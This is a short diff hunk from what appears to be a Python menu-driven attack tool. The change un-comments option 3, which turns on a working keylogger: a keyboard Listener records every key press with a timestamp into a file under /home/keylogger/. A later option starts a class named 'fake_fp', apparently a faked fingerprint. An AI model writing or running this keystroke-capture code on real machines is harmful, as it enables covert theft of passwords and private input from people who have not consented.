@@ -93,13 +93,13 @@ elif x==2:
         sys.exit()
 
 elif x==3:
-    #log_dir = "/home/keylogger/"
-    #logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    log_dir = "/home/keylogger/"
+    logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-    #def on_press(key):
-        #logging.info(str(key))
-    #with Listener(on_press=on_press) as listener:
-        #listener.join()
+    def on_press(key):
+        logging.info(str(key))
+    with Listener(on_press=on_press) as listener:
+        listener.join()
     sys.exit()
 elif x==4:
     class fake_fp:
